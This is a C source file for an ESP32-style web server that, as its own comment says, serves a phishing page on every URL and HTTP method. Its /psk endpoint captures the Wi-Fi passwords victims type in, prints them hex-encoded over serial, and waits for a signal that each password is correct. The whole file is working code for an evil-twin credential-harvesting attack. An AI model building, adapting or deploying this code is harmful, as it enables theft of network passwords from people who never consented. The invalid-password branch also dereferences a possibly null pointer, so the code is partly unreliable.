/**
 * @file web_server.c
 * @author johndeweyzxc (johndewey02003@gmail.com)
 * @brief Implements functionality for creating HTTP web server
 */

#include "web_server.h"

#include <stdio.h>
#include <string.h>
#include <sys/socket.h>

#include "cJSON.h"
#include "esp_err.h"
#include "esp_http_server.h"
#include "page_index.h"
#include "utils.h"

static httpd_config_t config = HTTPD_DEFAULT_CONFIG();
static httpd_handle_t server = NULL;

static uint8_t psk_status = PSK_NO_REPLY;

bool httpd_uri_matcher(const char *template_input, const char *uri,
                       size_t len) {
  const size_t tpl_len = strlen(template_input);
  size_t exact_match_chars = tpl_len;

  /* Check for trailing question mark and asterisk */
  const char last = tpl_len > 0 ? template_input[tpl_len - 1] : 0;
  const char prevlast = tpl_len > 1 ? template_input[tpl_len - 2] : 0;
  const bool asterisk = last == '*' || (prevlast == '*' && last == '?');
  const bool quest = last == '?' || (prevlast == '?' && last == '*');

  /* Minimum template_input string length must be:
   *      0 : if neither of '*' and '?' are present
   *      1 : if only '*' is present
   *      2 : if only '?' is present
   *      3 : if both are present
   *
   * The expression (asterisk + quest*2) serves as a
   * case wise generator of these length values
   */

  /* abort in cases such as "?" with no preceding character (invalid
   * template_input)
   */
  if (exact_match_chars < asterisk + quest * 2) {
    return false;
  }

  /* account for special characters and the optional character if "?" is used */
  exact_match_chars -= asterisk + quest * 2;

  if (len < exact_match_chars) {
    return false;
  }

  if (!quest) {
    if (!asterisk && len != exact_match_chars) {
      /* no special characters and different length - strncmp would return false
       */
      return false;
    }
    /* asterisk allows arbitrary trailing characters, we ignore these using
     * exact_match_chars as the length limit */
    return (strncmp(template_input, uri, exact_match_chars) == 0);
  } else {
    /* question mark present */
    if (len > exact_match_chars &&
        template_input[exact_match_chars] != uri[exact_match_chars]) {
      /* the optional character is present, but different */
      return false;
    }
    if (strncmp(template_input, uri, exact_match_chars) != 0) {
      /* the mandatory part differs */
      return false;
    }
    /* Now we know the URI is longer than the required part of template_input,
     * the mandatory part matches, and if the optional character is present, it
     * is correct. Match is OK if we have asterisk, i.e. any trailing characters
     * are OK, or if there are no characters beyond the optional character. */
    return asterisk || len <= exact_match_chars + 1;
  }
}

void encode_ascii_to_hex(char *str, uint8_t *arr) {
  size_t length = strlen(str);
  for (size_t i = 0; i < length; i++) {
    arr[i] = (uint8_t)str[i];
  }
  arr[length] = 0;
}

static esp_err_t web_psk_and_root_endpoint(httpd_req_t *req) {
  if (strcmp(req->uri, "/psk") == 0) {
    char recv_buff[req->content_len + 1];
    // printf("Receive content length: %zu\n", req->content_len);
    int ret = httpd_req_recv(req, recv_buff, req->content_len);

    if (ret <= 0) {
      /* 0 return value indicates connection closed */
      if (ret == HTTPD_SOCK_ERR_TIMEOUT) {
        /* In case of timeout one can choose to retry calling
         * httpd_req_recv(), but to keep it simple, here we
         * respond with an HTTP 408 (Request Timeout) error */
        httpd_resp_send_408(req);
      }
      return ESP_FAIL;
    }
    // printf("Content: %s\n", recv_buff);

    /* Parse JSON data using cJSON library */
    cJSON *root = cJSON_Parse(recv_buff);
    if (root == NULL) {
      /* Parsing failed, indicating that the data is not valid JSON */
      httpd_resp_send_500(req);
      return ESP_FAIL;
    }

    /* Check if 'psk' key exists and has a valid length */
    cJSON *psk = cJSON_GetObjectItem(root, "psk");
    httpd_resp_set_type(req, "application/json");
    size_t json_response_len = 16;
    char json_response[json_response_len];

    if (psk != NULL && cJSON_IsString(psk)) {
      size_t length = strlen(psk->valuestring);
      uint8_t arr[length + 1];
      encode_ascii_to_hex(psk->valuestring, arr);

      // printf("{WEB,POST_PSK,%s,}\n", psk->valuestring);
      printf("{WEB,POST_PSK,");
      util_print_uint8t_into_hex(arr, length + 1);
      printf("}\n");
    } else {
      // Invalid password
      size_t length = strlen(psk->valuestring);
      uint8_t arr[length + 1];
      encode_ascii_to_hex(psk->valuestring, arr);

      // printf("{WEB,POST_INVALID_PSK,%s,}\n", psk->valuestring);
      printf("{WEB,POST_INVALID_PSK,");
      util_print_uint8t_into_hex(arr, length + 1);
      printf("}\n");
    }

    while (1) {
      vTaskDelay(50 / portTICK_PERIOD_MS);
      if (psk_status == PSK_CORRECT) {
        snprintf(json_response, json_response_len, "{\"success\":\"y\"}");
        printf("web_server.web_psk_and_root_endpoint> Password is correct\n");
        break;
      } else if (psk_status == PSK_INCORRECT) {
        snprintf(json_response, json_response_len, "{\"success\":\"n\"}");
        printf("web_server.web_psk_and_root_endpoint> Password is incorrect\n");
        break;
      }
    }

    psk_status = PSK_NO_REPLY;
    httpd_resp_send(req, json_response, json_response_len);
    return ESP_OK;
  }

  /* Send the HTML page instead */
  httpd_resp_set_type(req, "text/html");
  httpd_resp_set_hdr(req, "Content-Encoding", "gzip");
  httpd_resp_send(req, (const char *)page_index, page_index_len);
  return ESP_OK;
}

void web_psk_status(uint8_t status) { psk_status = status; }

static esp_err_t web_root_endpoint(httpd_req_t *req) {
  printf("{WEB,GET_ROOT,}\n");
  /* Send the HTML page instead */
  httpd_resp_set_type(req, "text/html");
  httpd_resp_set_hdr(req, "Content-Encoding", "gzip");
  httpd_resp_send(req, (const char *)page_index, page_index_len);
  return ESP_OK;
}

/*
 * Hook all different kinds of HTTP methods so the server always responds with
 * the phishing site regardless of the HTTP method
 */

static httpd_uri_t root_get = {.uri = "/*",
                               .method = HTTP_GET,
                               .handler = web_root_endpoint,
                               .user_ctx = NULL};

static httpd_uri_t root_post = {.uri = "/*",
                                .method = HTTP_POST,
                                .handler = web_psk_and_root_endpoint,
                                .user_ctx = NULL};

static httpd_uri_t root_put = {.uri = "/*",
                               .method = HTTP_PUT,
                               .handler = web_root_endpoint,
                               .user_ctx = NULL};

static httpd_uri_t root_delete = {.uri = "/*",
                                  .method = HTTP_DELETE,
                                  .handler = web_root_endpoint,
                                  .user_ctx = NULL};

static httpd_uri_t root_options = {.uri = "/*",
                                   .method = HTTP_OPTIONS,
                                   .handler = web_root_endpoint,
                                   .user_ctx = NULL};

static httpd_uri_t root_trace = {.uri = "/*",
                                 .method = HTTP_TRACE,
                                 .handler = web_root_endpoint,
                                 .user_ctx = NULL};

static httpd_uri_t root_head = {.uri = "/*",
                                .method = HTTP_HEAD,
                                .handler = web_root_endpoint,
                                .user_ctx = NULL};

static httpd_uri_t root_connect = {.uri = "/*",
                                   .method = HTTP_CONNECT,
                                   .handler = web_root_endpoint,
                                   .user_ctx = NULL};

static httpd_uri_t root_patch = {.uri = "/*",
                                 .method = HTTP_PATCH,
                                 .handler = web_root_endpoint,
                                 .user_ctx = NULL};

// void close_fd_cb(httpd_handle_t hd, int sockfd) {
//   struct linger so_linger;
//   so_linger.l_onoff = true;
//   so_linger.l_linger = 0;
//   int s = lwip_setsockopt(sockfd, SOL_SOCKET, SO_LINGER, &so_linger,
//                           sizeof(so_linger));
//   if (s < 0) {
//     printf("web_server.close_fd_cb: Failed to set sock opt fd %d", sockfd);
//   }

//   int c = close(sockfd);
//   if (c != 0) {
//     printf("web_server.close_fd_cb: Failed to close sock fd %d", sockfd);
//   }
// }

void web_server_stop() {
  if (server != NULL) {
    ESP_ERROR_CHECK(httpd_stop(server));
    server = NULL;
    printf("{WEB,SERVER_STOPPED,}\n");
  }
}

void web_server_start() {
  config.uri_match_fn = httpd_uri_matcher;
  // config.enable_so_linger = false;
  // config.close_fn = close_fd_cb;
  config.max_uri_handlers = 9;
  ESP_ERROR_CHECK(httpd_start(&server, &config));
  ESP_ERROR_CHECK(httpd_register_uri_handler(server, &root_get));
  ESP_ERROR_CHECK(httpd_register_uri_handler(server, &root_post));
  ESP_ERROR_CHECK(httpd_register_uri_handler(server, &root_put));
  ESP_ERROR_CHECK(httpd_register_uri_handler(server, &root_delete));
  ESP_ERROR_CHECK(httpd_register_uri_handler(server, &root_options));
  ESP_ERROR_CHECK(httpd_register_uri_handler(server, &root_trace));
  ESP_ERROR_CHECK(httpd_register_uri_handler(server, &root_head));
  ESP_ERROR_CHECK(httpd_register_uri_handler(server, &root_connect));
  ESP_ERROR_CHECK(httpd_register_uri_handler(server, &root_patch));

  printf("{WEB,SERVER_STARTED,}\n");
}